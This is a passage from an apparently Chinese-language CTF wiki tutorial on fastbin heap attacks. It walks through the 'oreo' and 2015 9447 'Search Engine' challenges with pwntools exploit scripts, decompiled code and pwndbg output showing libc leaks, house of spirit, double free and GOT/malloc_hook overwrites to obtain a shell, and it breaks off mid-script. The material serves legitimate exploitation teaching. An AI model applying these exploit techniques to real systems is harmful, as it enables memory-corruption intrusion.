\u8868\u7684\u4f4d\u7f6e\u3002\u5f53\u8fdb\u884c\u5c55\u793a\u7684\u65f6\u5019\uff0c\u5373\u53ef\u4ee5\u8f93\u51fa\u5bf9\u5e94\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u540c\u65f6\u9700\u8981\u786e\u4fdd\u5047\u8bbe\u5bf9\u5e94\u5730\u5740\u4e3a\u4e00\u4e2a\u67aa\u652f\u7ed3\u6784\u4f53\u65f6\uff0c\u5176 next \u6307\u9488\u4e3a NULL\u3002\u8fd9\u91cc\u6211\u91c7\u7528 puts@got\u3002\u901a\u8fc7\u8fd9\u6837\u7684\u64cd\u4f5c\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u5f97\u51fa libc \u57fa\u5730\u5740\uff0c\u4ee5\u53ca system \u51fd\u6570\u5730\u5740\u3002\n\n\n\u7531\u4e8e\u67aa\u652f\u7ed3\u6784\u4f53\u5927\u5c0f\u662f 0x38 \u5927\u5c0f\uff0c\u6240\u4ee5\u5176\u5bf9\u5e94\u7684 chunk \u4e3a 0x40\u3002\u8fd9\u91cc\u91c7\u7528 \nhouse of sprit\n \u7684\u6280\u672f\u6765\u8fd4\u56de 0x0804A2A8 \u5904\u7684chunk\uff0c\u5373\u7559\u4e0b\u7684\u6d88\u606f\u7684\u6307\u9488\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u8bbe\u7f6e 0x0804A2A4 \u5904\u7684\u5185\u5bb9\u4e3a 0x40\uff0c\u5373\u9700\u8981\u6dfb\u52a0 0x40 \u652f\u67aa\u652f\uff0c\u4ece\u800c\u7ed5\u8fc7\u5927\u5c0f\u68c0\u6d4b\u3002\u540c\u65f6\u4e3a\u4e86\u786e\u4fdd\u53ef\u4ee5\u7ed5\u8fc7 next chunk \u7684\u68c0\u6d4b\uff0c\u8fd9\u91cc\u6211\u4eec\u7f16\u8f91\u7559\u4e0b\u7684\u6d88\u606f\u3002\n\n\n\u5728\u6210\u529f\u5206\u914d\u8fd9\u6837\u7684 chunk \u540e\uff0c\u6211\u4eec\u5176\u5b9e\u5c31\u6709\u4e86\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u4fee\u6539\u7684\u6f0f\u6d1e\uff0c\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u4fee\u6539\u4e00\u4e2a\u5408\u9002\u7684 got \u9879\u4e3a system \u5730\u5740\uff0c\u4ece\u800c\u83b7\u5f97 shell\u3002\n\n\n\n\n\u5177\u4f53\u4ee3\u7801\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\ncontext\n.\nterminal\n \n=\n \n[\ngnome-terminal\n,\n \n-x\n,\n \nsh\n,\n \n-c\n]\n\n\nif\n \nargs\n[\nDEBUG\n]:\n\n    \ncontext\n.\nlog_level\n \n=\n \ndebug\n\n\ncontext\n.\nbinary\n \n=\n \n./oreo\n\n\noreo\n \n=\n \nELF\n(\n./oreo\n)\n\n\nif\n \nargs\n[\nREMOTE\n]:\n\n    \np\n \n=\n \nremote\n(\nip\n,\n \nport\n)\n\n\nelse\n:\n\n    \np\n \n=\n \nprocess\n(\n./oreo\n)\n\n\nlog\n.\ninfo\n(\nPID: \n \n+\n \nstr\n(\nproc\n.\npidof\n(\np\n)[\n0\n]))\n\n\nlibc\n \n=\n \nELF\n(\n./libc.so.6\n)\n\n\n\n\ndef\n \nadd\n(\ndescrip\n,\n \nname\n):\n\n    \np\n.\nsendline\n(\n1\n)\n\n    \n#p.recvuntil(\nRifle name: \n)\n\n    \np\n.\nsendline\n(\nname\n)\n\n    \n#p.recvuntil(\nRifle description: \n)\n\n    \n#sleep(0.5)\n\n    \np\n.\nsendline\n(\ndescrip\n)\n\n\n\n\ndef\n \nshow_rifle\n():\n\n    \np\n.\nsendline\n(\n2\n)\n\n    \np\n.\nrecvuntil\n(\n===================================\n\\n\n)\n\n\n\n\ndef\n \norder\n():\n\n    \np\n.\nsendline\n(\n3\n)\n\n\n\n\ndef\n \nmessage\n(\nnotice\n):\n\n    \np\n.\nsendline\n(\n4\n)\n\n    \n#p.recvuntil(\nEnter any notice you\nd like to submit with your order: \n)\n\n    \np\n.\nsendline\n(\nnotice\n)\n\n\n\n\ndef\n \nexp\n():\n\n    \nprint\n \nstep 1. leak libc base\n\n    \nname\n \n=\n \n27\n \n*\n \na\n \n+\n \np32\n(\noreo\n.\ngot\n[\nputs\n])\n\n    \nadd\n(\n25\n \n*\n \na\n,\n \nname\n)\n\n    \nshow_rifle\n()\n\n    \np\n.\nrecvuntil\n(\n===================================\n\\n\n)\n\n    \np\n.\nrecvuntil\n(\nDescription: \n)\n\n    \nputs_addr\n \n=\n \nu32\n(\np\n.\nrecvuntil\n(\n\\n\n,\n \ndrop\n=\nTrue\n)[:\n4\n])\n\n    \nlog\n.\nsuccess\n(\nputs addr: \n \n+\n \nhex\n(\nputs_addr\n))\n\n    \nlibc_base\n \n=\n \nputs_addr\n \n-\n \nlibc\n.\nsymbols\n[\nputs\n]\n\n    \nsystem_addr\n \n=\n \nlibc_base\n \n+\n \nlibc\n.\nsymbols\n[\nsystem\n]\n\n    \nbinsh_addr\n \n=\n \nlibc_base\n \n+\n \nnext\n(\nlibc\n.\nsearch\n(\n/bin/sh\n))\n\n\n    \nprint\n \nstep 2. free fake chunk at 0x0804A2A8\n\n\n    \n# now, oifle_cnt=1, we need set it = 0x40\n\n    \noifle\n \n=\n \n1\n\n    \nwhile\n \noifle\n \n \n0x3f\n:\n\n        \n# set next link=NULL\n\n        \nadd\n(\n25\n \n*\n \na\n,\n \na\n \n*\n \n27\n \n+\n \np32\n(\n0\n))\n\n        \noifle\n \n+=\n \n1\n\n    \npayload\n \n=\n \na\n \n*\n \n27\n \n+\n \np32\n(\n0x0804a2a8\n)\n\n    \n# set next link=0x0804A2A8, try to free a fake chunk\n\n    \nadd\n(\n25\n \n*\n \na\n,\n \npayload\n)\n\n    \n# before free, we need to bypass some check\n\n    \n# fake chunk\ns size is 0x40\n\n    \n# 0x20 *\na\n for padding the last fake chunk\n\n    \n# 0x40 for fake chunk\ns next chunk\ns prev_size\n\n    \n# 0x100 for fake chunk\ns next chunk\ns size\n\n    \n# set fake iofle\n next to be NULL\n\n    \npayload\n \n=\n \n0x20\n \n*\n \n\\x00\n \n+\n \np32\n(\n0x40\n)\n \n+\n \np32\n(\n0x100\n)\n\n    \npayload\n \n=\n \npayload\n.\nljust\n(\n52\n,\n \nb\n)\n\n    \npayload\n \n+=\n \np32\n(\n0\n)\n\n    \npayload\n \n=\n \npayload\n.\nljust\n(\n128\n,\n \nc\n)\n\n    \nmessage\n(\npayload\n)\n\n    \n# fastbin 0x40: 0x0804A2A0-\nsome where heap-\nNULL\n\n    \norder\n()\n\n    \np\n.\nrecvuntil\n(\nOkay order submitted!\n\\n\n)\n\n\n    \nprint\n \nstep 3. get shell\n\n    \n# modify free@got to system addr\n\n    \npayload\n \n=\n \np32\n(\noreo\n.\ngot\n[\nstrlen\n])\n.\nljust\n(\n20\n,\n \na\n)\n\n    \nadd\n(\npayload\n,\n \nb\n \n*\n \n20\n)\n\n    \nlog\n.\nsuccess\n(\nsystem addr: \n \n+\n \nhex\n(\nsystem_addr\n))\n\n    \n#gdb.attach(p)\n\n    \nmessage\n(\np32\n(\nsystem_addr\n)\n \n+\n \n;/bin/sh\n\\x00\n)\n\n\n    \np\n.\ninteractive\n()\n\n\n\n\nif\n \n__name__\n \n==\n \n__main__\n:\n\n    \nexp\n()\n\n\n\n\n\n\u5f53\u7136\uff0c\u8be5\u9898\u76ee\u4e5f\u53ef\u4ee5\u4f7f\u7528 \nfast bin attack\n \u4e2d\u7684\u5176\u5b83\u6280\u672f\u6765\u5b9e\u73b0\uff0c\u53ef\u53c2\u8003\u53c2\u8003\u6587\u732e\u4e2d\u7684\u94fe\u63a5\u3002\n\n\n2015 9447 CTF : Search Engine\n\n\n\u57fa\u672c\u4fe1\u606f\n\n\n\u279c  2015_9447ctf_search-engine git:\n(\nmaster\n)\n file search\nsearch: ELF \n64\n-bit LSB executable, x86-64, version \n1\n \n(\nSYSV\n)\n, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, \nfor\n GNU/Linux \n2\n.6.24, BuildID\n[\nsha1\n]=\n4f5b70085d957097e91f940f98c0d4cc6fb3343f, stripped\n\u279c  2015_9447ctf_search-engine git:\n(\nmaster\n)\n checksec search   \n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search\n\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x400000\n)\n\n    FORTIFY:  Enabled\n\n\n\n\n\u57fa\u672c\u529f\u80fd\n\n\n\u7a0b\u5e8f\u7684\u57fa\u672c\u529f\u80fd\u662f\n\n\n\n\n\u7d22\u5f15\u4e00\u4e2a\u53e5\u5b50\n\n\n\u5927\u5c0fv0\uff0c(unsigned int)(v0 - 1) \n 0xFFFD\n\n\n\u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u5fc5\u987b\u548c\u7ed9\u5b9a\u7684\u5927\u5c0f\u76f8\u7b49\n\n\n\u6bcf\u6b21\u7d22\u5f15\u7684\u53e5\u5b50\u90fd\u662f\u76f4\u63a5\u5728\u76f4\u63a5\u5efa\u7acb\u5728\u524d\u9762\u7684\u53e5\u5b50\u4e0a\u7684\u3002\n\n\n\u5728\u4e00\u4e2a\u53e5\u5b50\u4e2d\u641c\u7d22\u5355\u8bcd\n\n\n\u5927\u5c0fv0\uff0c(unsigned int)(v0 - 1) \n 0xFFFD\n\n\n\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u5b57\u7b26\u4e32\n\n\n\u5982\u679c\u6709\u56de\u8f66\u6807\u8bb0\n\n\n\u5728\u6307\u5b9a\u957f\u5ea6\u5185\u6ca1\u6709\u9047\u5230\u56de\u8f66\uff0c\u5219\u8bfb\u5b8c\u6ca1\u6709\u8bbe\u7f6eNULL\u6807\u8bb0\n\n\n\u5728\u6307\u5b9a\u957f\u5ea6\u5185\u9047\u5230\u56de\u8f66\uff0c\u5c31\u622a\u65ad\u8fd4\u56de\u3002\n\n\n\n\n\n\n\u6ca1\u6709\u56de\u8f66\u6807\u8bb0\n\n\n\u8bfb\u591f\u6307\u5b9a\u957f\u5ea6\uff0c\u6ca1\u6709NULL\u6807\u8bb0\u7ed3\u5c3e\u3002\n\n\n\n\n\n\n\n\n\u8bcd\u8bed\u7ed3\u6784\u4f53\n\n\n\u901a\u8fc7\u5206\u6790\u7d22\u5f15\u53e5\u5b50\u7684\u8fc7\u7a0b\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u8bcd\u8bed\u7684\u7ed3\u6784\u5982\u4e0b\n\n\n00000000 word_struct     struc ; (sizeof=0x28, mappedto_6)\n00000000 content         dq ?\n00000008 size            dd ?\n0000000C padding1        dd ?\n00000010 sentence_ptr    dq ?                    ; offset\n00000018 len             dd ?\n0000001C padding2        dd ?\n00000020 next            dq ?                    ; offset\n00000028 word_struct     ends\n\n\n\n\n\u5806\u5185\u5b58\u76f8\u5173\u64cd\u4f5c\n\n\n\u5206\u914d\n\n\n\n\nmalloc 40 \u5b57\u8282\u4e3a\u4e00\u4e2aword\u7ed3\u6784\u4f53\n\n\n\u4e3a\u53e5\u5b50\u6216\u8005\u5355\u8bcd malloc \u6307\u5b9a\u5927\u5c0f\u3002\n\n\n\n\n\u91ca\u653e\n\n\n\n\n\u91ca\u653e\u5220\u9664\u7684\u53e5\u5b50\n\n\n\u91ca\u653e\u5220\u9664\u53e5\u5b50\u6240\u641c\u7d22\u7684\u4e34\u65f6\u5355\u8bcd\n\n\n\u91ca\u653e\u7d22\u5f15\u53e5\u5b50\u65f6\u672a\u4f7f\u7528\u7684\u5355\u8bcd\u7ed3\u6784\n\n\n\n\n\u6f0f\u6d1e\n\n\n\u7d22\u5f15\u53e5\u5b50\u8bfb\u53d6\u5b57\u7b26\u4e32\u65f6\u65e0NULL\u7ed3\u5c3e\n\n\n\u5728\u7d22\u5f15\u53e5\u5b50\u65f6 flag_enter \u6c38\u8fdc\u4e3a 0\uff0c\u6240\u4ee5\u8bfb\u53d6\u53e5\u5b50\u65f6\u6700\u540e\u6ca1\u6709 NULL \u7ed3\u5c3e\u3002\n\n\n    \n_flag_enter\n \n=\n \nflag_enter\n;\n\n    \nv4\n \n=\n \n0\n;\n\n    \nwhile\n \n(\n \n1\n \n)\n\n    \n{\n\n      \nv5\n \n=\n \ns\n[\nv4\n];\n\n      \nv6\n \n=\n \nfread\n(\ns\n[\nv4\n],\n \n1uLL\n,\n \n1uLL\n,\n \nstdin\n);\n\n      \nif\n \n(\n \nv6\n \n=\n \n0\n \n)\n\n        \nbreak\n;\n\n      \nif\n \n(\n \n*\nv5\n \n==\n \n\\n\n \n \n_flag_enter\n \n)\n\n      \n{\n\n        \nif\n \n(\n \nv4\n \n)\n\n        \n{\n\n          \n*\nv5\n \n=\n \n0\n;\n\n          \nreturn\n;\n\n        \n}\n\n        \nv4\n \n=\n \nv6\n \n-\n \n1\n;\n\n        \nif\n \n(\n \nlen\n \n=\n \nv6\n \n-\n \n1\n \n)\n\n          \nbreak\n;\n\n      \n}\n\n      \nelse\n\n      \n{\n\n        \nv4\n \n+=\n \nv6\n;\n\n        \nif\n \n(\n \nlen\n \n=\n \nv4\n \n)\n\n          \nbreak\n;\n\n      \n}\n\n    \n}\n\n\n\n\n\n\u8bfb\u53d6\u9009\u62e9\u64cd\u4f5c\u6570\n\n\n__int64\n \nread_num\n()\n\n\n{\n\n  \n__int64\n \nresult\n;\n \n// rax\n\n  \nchar\n \n*\nendptr\n;\n \n// [rsp+8h] [rbp-50h]\n\n  \nchar\n \nnptr\n;\n \n// [rsp+10h] [rbp-48h]\n\n  \nunsigned\n \n__int64\n \nv3\n;\n \n// [rsp+48h] [rbp-10h]\n\n\n  \nv3\n \n=\n \n__readfsqword\n(\n0x28u\n);\n\n  \nread_str\n(\nnptr\n,\n \n48\n,\n \n1\n);\n\n  \nresult\n \n=\n \nstrtol\n(\nnptr\n,\n \nendptr\n,\n \n0\n);\n\n  \nif\n \n(\n \nendptr\n \n==\n \nnptr\n \n)\n\n  \n{\n\n    \n__printf_chk\n(\n1LL\n,\n \n%s is not a valid number\n\\n\n,\n \nnptr\n);\n\n    \nresult\n \n=\n \nread_num\n();\n\n  \n}\n\n  \n__readfsqword\n(\n0x28u\n);\n\n  \nreturn\n \nresult\n;\n\n\n}\n\n\n\n\n\n\u56e0\u4e3a read_str \u4e0d\u8bbe\u7f6eNULL \uff0c\u56e0\u6b64\uff0c\u5982\u679c nptr \u8bfb\u53d6\u7684\u4e0d\u5408\u6cd5\u7684\u8bdd\uff0c\u5c31\u6709\u53ef\u80fd\u4f1a leak \u51fa\u6808\u4e0a\u7684\u5185\u5bb9\u3002\n\n\n\u7d22\u5f15\u53e5\u5b50\u91ca\u653e\u672a\u7f6eNULL\n\n\n  \nelse\n\n  \n{\n\n    \nfree\n(\nv6\n);\n\n  \n}\n\n\n\n\n\n\u641c\u7d22\u8bcd\u8bed\u4e2d\u5220\u9664\u8bcd\u8bed\u65f6\uff0c\u5bf9\u5e94\u53e5\u5b50\u6307\u9488\u53ea\u662f\u91ca\u653e\uff0c\u5e76\u6ca1\u6709\u8bbe\u7f6e\u4e3aNULL\n\n\n  \nfor\n \n(\n \ni\n \n=\n \nhead\n;\n \ni\n;\n \ni\n \n=\n \ni\n-\nnext\n \n)\n\n  \n{\n\n    \nif\n \n(\n \n*\ni\n-\nsentence_ptr\n \n)\n\n    \n{\n\n      \nif\n \n(\n \nLODWORD\n(\ni\n-\nsize\n)\n \n==\n \nv0\n \n \n!\nmemcmp\n((\nconst\n \nvoid\n \n*\n)\ni\n-\ncontent\n,\n \nv1\n,\n \nv0\n)\n \n)\n\n      \n{\n\n        \n__printf_chk\n(\n1LL\n,\n \nFound %d: \n,\n \nLODWORD\n(\ni\n-\nlen\n));\n\n        \nfwrite\n(\ni\n-\nsentence_ptr\n,\n \n1uLL\n,\n \nSLODWORD\n(\ni\n-\nlen\n),\n \nstdout\n);\n\n        \nputchar\n(\n\\n\n);\n\n        \nputs\n(\nDelete this sentence (y/n)?\n);\n\n        \nread_str\n(\nchoice\n,\n \n2\n,\n \n1\n);\n\n        \nif\n \n(\n \nchoice\n \n==\n \ny\n \n)\n\n        \n{\n\n          \nmemset\n(\ni\n-\nsentence_ptr\n,\n \n0\n,\n \nSLODWORD\n(\ni\n-\nlen\n));\n\n          \nfree\n(\ni\n-\nsentence_ptr\n);\n\n          \nputs\n(\nDeleted!\n);\n\n        \n}\n\n      \n}\n\n    \n}\n\n  \n}\n\n  \nfree\n(\nv1\n);\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u6bcf\u6b21\u91ca\u653e i-\nsentence_ptr \u4e4b\u524d\uff0c\u8fd9\u4e2a\u53e5\u5b50\u7684\u5185\u5bb9\u5c31\u4f1a\u5168\u90e8\u88ab\u8bbe\u7f6e\u4e3a \n\\x00\n \uff0c\u7531\u4e8e\u5355\u8bcd\u7ed3\u6784\u4f53\u4e2d\u5b58\u50a8\u7684\u5355\u8bcd\u53ea\u662f\u53e5\u5b50\u7684\u4e00\u4e2a\u6307\u9488\uff0c\u6240\u4ee5\u5355\u8bcd\u4e5f\u4f1a\u88ab\u7f6e\u4e3a \n\\x00\n \u3002\u8be5\u53e5\u5b50\u5bf9\u5e94\u7684\u90a3\u4e9b\u5355\u8bcd\u4ecd\u7136\u662f\u5b58\u5728\u4e8e\u94fe\u8868\u4e2d\u7684\uff0c\u5e76\u6ca1\u6709\u88ab\u5220\u9664\uff0c\u56e0\u6b64\u6bcf\u6b21\u641c\u7d22\u5355\u8bcd\u7684\u65f6\u5019\uff0c\u4ecd\u7136\u4f1a\u5224\u65ad\u3002\u770b\u8d77\u6765\u7531\u4e8e\u53e5\u5b50\u5185\u5bb9\u88ab\u7f6e\u4e3a \n\\x00\n \u53ef\u4ee5\u9632\u6b62\u901a\u8fc7 \n*i-\nsentence_ptr\n \u9a8c\u8bc1\u3002\u7136\u800c\uff0c\u7531\u4e8e chunk \u88ab\u91ca\u653e\u540e\u4f1a\u88ab\u653e\u5230 bin \u4e2d\uff0c\u5f53 chunk \u4e0d\u662f fastbin \u6216\u8005 chunk \u88ab\u91cd\u65b0\u5206\u914d\u51fa\u53bb\u4f7f\u7528\u7684\u65f6\u5019\uff0c\u4e5f\u5c31\u6709\u53ef\u80fd\u4f1a\u4ea7\u751f double free \u7684\u60c5\u51b5\u3002\u6b64\u5916\uff0c\u5f53\u53e5\u5b50\u88ab \nmemset\n \u7684\u65f6\u5019\uff0c\u5355\u8bcd\u867d\u7136\u90fd\u53d8\u4e3a\u4e86 \n\\x00\n \uff0c\u4f46\u662f\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u901a\u8fc7\u4e24\u4e2a \n\\x00\n \u7684\u6bd4\u8f83\u6765\u7ed5\u8fc7 \nmemcmp\n \u7684\u68c0\u6d4b\u3002\n\n\n\u5229\u7528\n\n\n\u5229\u7528\u601d\u8def\n\n\n\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u5229\u7528 unsorted bin \u5730\u5740\u6cc4\u6f0f libc \u57fa\u5730\u5740\n\n\n\u5229\u7528 double free \u6784\u9020 fastbin \u5faa\u73af\u94fe\u8868\n\n\n\u5206\u914d chunk \u5230 malloc_hook \u9644\u8fd1\uff0c\u4fee\u6539malloc_hook \u4e3a one_gadget\n\n\n\n\n\u6cc4\u6f0f libc \u5730\u5740\n\n\n\u8fd9\u91cc\u6211\u4eec\u5206\u914d\u4e00\u4e2a small bin \u5927\u5c0f\u7684 chunk \uff0c\u5f53\u5b83\u88ab\u91ca\u653e\u540e\uff0c\u5c31\u4f1a\u653e\u5165\u5230 unsorted bin \u4e2d\u3002\u56e0\u800c\uff0c\u53ea\u8981 \nunsorted bin\n \u7684\u5730\u5740\u7684\u8d77\u59cb\u5b57\u8282\u4e0d\u662f \n\\x00\n \u4fbf\u53ef\u4ee5\u901a\u8fc7\u9a8c\u8bc1\u3002\u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020 \n\\x00\n \u6765\u8fdb\u884c\u6bd4\u8f83\uff0c\u4ece\u800c\u901a\u8fc7\u9a8c\u8bc1\u3002\u5177\u4f53\u5982\u4e0b\n\n\ndef\n \nleak_libc\n():\n\n    \nsmallbin_sentence\n \n=\n \ns\n \n*\n \n0x85\n \n+\n \n m \n\n    \nindex_sentence\n(\nsmallbin_sentence\n)\n\n    \nsearch_word\n(\nm\n)\n\n    \np\n.\nrecvuntil\n(\nDelete this sentence (y/n)?\n\\n\n)\n\n    \np\n.\nsendline\n(\ny\n)\n\n    \nsearch_word\n(\n\\x00\n)\n\n    \np\n.\nrecvuntil\n(\nFound \n \n+\n \nstr\n(\nlen\n(\nsmallbin_sentence\n))\n \n+\n \n: \n)\n\n    \nunsortedbin_addr\n \n=\n \nu64\n(\np\n.\nrecv\n(\n8\n))\n\n    \np\n.\nrecvuntil\n(\nDelete this sentence (y/n)?\n\\n\n)\n\n    \np\n.\nsendline\n(\nn\n)\n\n    \nreturn\n \nunsortedbin_addr\n\n\n\n\n\n\u6784\u9020 fastbin \u5faa\u73af\u94fe\u8868\n\n\n\u7531\u4e8e\u6211\u4eec\u6700\u540e\u5e0c\u671b\u5728 malloc_hook \u5904\u5206\u914d chunk\uff0c\u800c\u4e00\u822c\u5206\u914d malloc_hook \u9644\u8fd1\u7684 chunk \u4e00\u822c\u5927\u5c0f\u90fd\u662f0x7f\u3002\u5373\uff0c\u6211\u4eec\u6240\u9700\u8981\u8bbe\u7f6e\u7684\u8bbe\u7f6e\u7684 fast bin \u7684\u6570\u636e\u5b57\u8282\u90e8\u5206\u7684\u5927\u5c0f\u4e3a 0x60\u3002\u8fd9\u91cc\u6211\u4eec\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u6784\u9020\n\n\n\n\n\u5206\u522b\u7d22\u5f15\u53e5\u5b50a\uff0c\u7d22\u5f15\u53e5\u5b50b\uff0c\u7d22\u5f15\u53e5\u5b50c\uff0c\u5219\u6b64\u65f6\u5355\u8bcd\u94fe\u8868\u4e2d\u7d22\u5f15\u7684\u53e5\u5b50\u7684\u76f8\u5bf9\u987a\u5e8f\u4e3ac-\nb-\na\u3002\u5047\u8bbe\u53e5\u5b50 a \u4e3a'a' * 0x5d+' d '\uff0c\u53e5\u5b50 b \u4e3a 'b' * 0x5d+' d '\uff0c\u53e5\u5b50c\u7c7b\u4f3c\u3002\n\n\n\u7d22\u5f15\u5355\u8bcdd\uff0c\u4e09\u4e2a\u5747\u5220\u9664\uff0c\u5219\u6b64\u65f6 fastbin \u4e2d\u7684\u94fe\u8868\u60c5\u51b5\u4e3a a-\nb-\nc-\nNULL\uff0c\u8fd9\u662f\u56e0\u4e3a\u9996\u5148\u91ca\u653e\u7684\u662f\u53e5\u5b50c\uff0c\u6700\u540e\u91ca\u653e\u7684\u662f\u53e5\u5b50 a \u3002\u8fd9\u65f6\uff0c\u641c\u7d22\u5355\u8bcd\u65f6\n*i-\nsentence_ptr\n \u5bf9\u4e8ea, b \u6765\u8bf4\u90fd\u662f\u53ef\u4ee5\u7ed5\u8fc7\u7684\u3002\n\n\n\u6211\u4eec\u6b64\u65f6\u518d\u6b21\u5220\u9664\u641c\u7d22\u5355\u8bcd \n\\x00\n\u3002\u9996\u5148\u904d\u5386\u7684\u662f c\uff0c\u4f46\u662f c \u7684\u9a8c\u8bc1\u4e0d\u901a\u8fc7\uff1b\u5176\u6b21\u904d\u5386\u7684\u662fb\uff0c\u9a8c\u8bc1\u901a\u8fc7\uff0c\u6211\u4eec\u5c06\u5176\u91ca\u653e\uff1b\u5176\u6b21\u904d\u5386\u7684\u662fa\uff0c\u9a8c\u8bc1\u901a\u8fc7\uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u5220\u9664\u3002\u5219\u6b64\u65f6 fastbin \u7684\u60c5\u51b5\u4e3a b-\na-\nb-\na-\n...\u3002\u5373\u5df2\u7ecf\u6784\u6210\u4e86double free b\u7684\u60c5\u51b5\u3002\u7531\u4e8e\u6211\u4eec\u5148\u524d\u4e3a\u4e86 leak libc \u8fd8\u5efa\u7acb\u4e00\u4e2a\u53e5\u5b50\uff0c\u6240\u4ee5\u8fd8\u6709\u4e00\u4e2a\u5355\u8bcd\u53ef\u4ee5\u6bd4\u8f83\uff0c\u8fd9\u91cc\u6211\u4eec\u4e5f\u4e0d\u5220\u9664\u3002\n\n\n\n\n\u5177\u4f53\u4ee3\u7801\u5982\u4e0b\n\n\n    \n# 2. create cycle fastbin 0x70 size\n\n    \nindex_sentence\n(\na\n \n*\n \n0x5d\n \n+\n \n d \n)\n  \n#a\n\n    \nindex_sentence\n(\nb\n \n*\n \n0x5d\n \n+\n \n d \n)\n  \n#b\n\n    \nindex_sentence\n(\nc\n \n*\n \n0x5d\n \n+\n \n d \n)\n  \n#c\n\n\n    \n# a-\nb-\nc-\nNULL\n\n    \nsearch_word\n(\nd\n)\n\n    \np\n.\nrecvuntil\n(\nDelete this sentence (y/n)?\n\\n\n)\n\n    \np\n.\nsendline\n(\ny\n)\n\n    \np\n.\nrecvuntil\n(\nDelete this sentence (y/n)?\n\\n\n)\n\n    \np\n.\nsendline\n(\ny\n)\n\n    \np\n.\nrecvuntil\n(\nDelete this sentence (y/n)?\n\\n\n)\n\n    \np\n.\nsendline\n(\ny\n)\n\n\n    \n# b-\na-\nb-\na-\n...\n\n    \nsearch_word\n(\n\\x00\n)\n\n    \np\n.\nrecvuntil\n(\nDelete this sentence (y/n)?\n\\n\n)\n\n    \np\n.\nsendline\n(\ny\n)\n\n    \np\n.\nrecvuntil\n(\nDelete this sentence (y/n)?\n\\n\n)\n\n    \np\n.\nsendline\n(\nn\n)\n\n    \np\n.\nrecvuntil\n(\nDelete this sentence (y/n)?\n\\n\n)\n\n    \np\n.\nsendline\n(\nn\n)\n\n\n\n\n\n\u6548\u679c\u5982\u4e0b\n\n\npwndbg\n fastbins \nfastbins\n0x20: 0x0\n0x30: 0x1d19320 \u25c2\u2014 0x0\n0x40: 0x0\n0x50: 0x0\n0x60: 0x0\n0x70: 0x1d191b0 \u2014\u25b8 0x1d19010 \u2014\u25b8 0x1d191b0 \u25c2\u2014 0x1d19010\n0x80: 0x0\n\n\n\n\n\u5206\u914d malloc_hook \u9644\u8fd1chunk\n\n\n\u6b64\u65f6\uff0cfastbin \u7684\u94fe\u8868\u4e3a b-\na-\nb-\na-\n\u2026\uff0c\u5219\u6211\u4eec\u53ef\u4ee5\u5728\u7533\u8bf7\u7b2c\u4e00\u4e2a\u76f8\u540c\u5927\u5c0f\u7684 chunk \u65f6\uff0c\u8bbe\u7f6e b \u7684 fd \u4e3a malloc_hook \u9644\u8fd1\u5904\u7684 chunk \n0x7fd798586aed\n\uff08\u8fd9\u91cc\u662f\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u4ee3\u7801\u4e2d\u9700\u4f7f\u7528\u76f8\u5bf9\u5730\u5740\uff09\u3002\n\n\npwndbg\n print \n(\nvoid*\n)\nmain_arena \n\n$1\n \n=\n \n(\nvoid *\n)\n 0x7fd798586b20 \nmain_arena\n\npwndbg\n x/8gx 0x7fd798586b20-16\n0x7fd798586b10 \n__malloc_hook\n: 0x0000000000000000  0x0000000000000000\n0x7fd798586b20 \nmain_arena\n:    0x0000000000000000  0x0000000000bce130\n0x7fd798586b30 \nmain_arena+16\n: 0x0000000000000000  0x0000000000000000\n0x7fd798586b40 \nmain_arena+32\n: 0x0000000000000000  0x0000000000000000\npwndbg\n find_fake_fast 0x7fd798586b10 0x7f\nFAKE CHUNKS\n0x7fd798586aed PREV_INUSE IS_MMAPED NON_MAIN_ARENA \n{\n\n  \nprev_size\n \n=\n \n15535264025435701248\n, \n  \nsize\n \n=\n \n127\n, \n  \nfd\n \n=\n 0xd798247e20000000, \n  \nbk\n \n=\n 0xd798247a0000007f, \n  \nfd_nextsize\n \n=\n 0x7f, \n  \nbk_nextsize\n \n=\n 0x0\n\n}\n\npwndbg\n print /x 0x7fd798586b10-0x7fd798586aed\n\n$2\n \n=\n 0x23\npwndbg\n print /x 0x7fd798586b20-0x7fd798586aed\n\n$3\n \n=\n 0x33\n\n\n\n\n\u90a3\u4e48\u5f53\u518d\u6b21\u5206\u914d b \u7684\u65f6\u5019\uff0c\u7531\u4e8e\u6b64\u65f6 b \u7684 fd \u5df2\u7ecf\u88ab\u6211\u4eec\u4fee\u6539\u4e3a\u4e86malloc_hook\u9644\u8fd1\u7684\u5730\u5740\uff0c\u6240\u4ee5\u8fd9\u65f6\u5019\u6211\u4eec\u518d\u6b21\u5206\u914d\u4e00\u4e2a chunk\uff0c\u5c31\u4f1a\u6307\u5411 \n0x7fd798586aed\n\u3002 \u6b64\u540e\u4fbf\u53ea\u9700\u8981\u5c06 malloc_hook \u4fee\u6539\u4e3a one_gadget \u5730\u5740\u5c31\u53ef\u4ee5\u62ff\u5230 shell \u4e86\u3002\n\n\n    \n# 3. fastbin attack to malloc_hook nearby chunk\n\n    \nfake_chunk_addr\n \n=\n \nmain_arena_addr\n \n-\n \n0x33\n\n    \nfake_chunk\n \n=\n \np64\n(\nfake_chunk_addr\n)\n.\nljust\n(\n0x60\n,\n \nf\n)\n\n\n    \nindex_sentence\n(\nfake_chunk\n)\n\n\n    \nindex_sentence\n(\na\n \n*\n \n0x60\n)\n\n\n   